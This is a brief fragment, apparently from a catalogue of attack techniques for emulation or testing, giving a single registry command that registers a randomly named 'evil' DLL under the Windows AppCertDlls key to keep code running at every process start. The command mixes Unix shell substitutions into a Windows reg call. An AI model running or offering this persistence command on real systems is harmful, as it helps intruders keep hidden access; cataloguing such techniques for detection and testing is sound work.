...
# Registering malicious AppCert DLL for persistence via registry.
...
## Attack Command
```
reg add "HKLM\System\CurrentControlSet\Control\Session Manager\AppCertDlls" /v $(cat /dev/urandom | tr -dc 'A-Za-z' | head -c 8) /t REG_SZ /d "C:\Windows\System32\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll)"
```
